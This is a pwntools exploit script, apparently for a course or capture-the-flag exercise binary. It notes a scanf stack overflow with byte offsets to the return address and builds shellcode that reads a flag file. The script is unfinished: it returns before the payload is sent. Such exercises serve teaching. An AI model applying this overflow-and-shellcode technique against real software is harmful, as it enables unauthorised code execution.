#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise2/exercise2a'
exe = './exercise2a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
'''
arch     x86
baddr    0x400000
binsz    14991
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
# From description:
# 1) Spawn shell -> https://docs.pwntools.com/en/stable/shellcraft/amd64.html (on local machine i386) or direct via https://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.cat
# 2) cat flag -> how cat flag?

# (Static) Analysis:
# Vuln.: scanf in check_authorization -> can overflow buffer and reprogram return address
# 96 bytes until main's rbp value; 104 bytes until ret address into main; 112 bytes to overwrite return address into main

def exploit():
    shell_cat_flag = asm(shellcraft.amd64.linux.cat("flag")) #43 bytes long; https://defuse.ca/online-x86-assembler.htm#disassembly
    remaining_buffer_size = 96 - len(shell_cat_flag)
    
    print("Size of shell_cat_flag: ", end="")
    print(len(shell_cat_flag))
    
    main_rbp_overwrite = b'BBBBBBBB'
    
    to_main_ret_address_overwrite = r.recvline()
    print("Address: ", end="")
    print(to_main_ret_address_overwrite)
    return
    
    fill_buffer = b'A' * remaining_buffer_size
    r.sendline(shell_cat_flag + fill_buffer)
    print(r.recvline())

exploit()


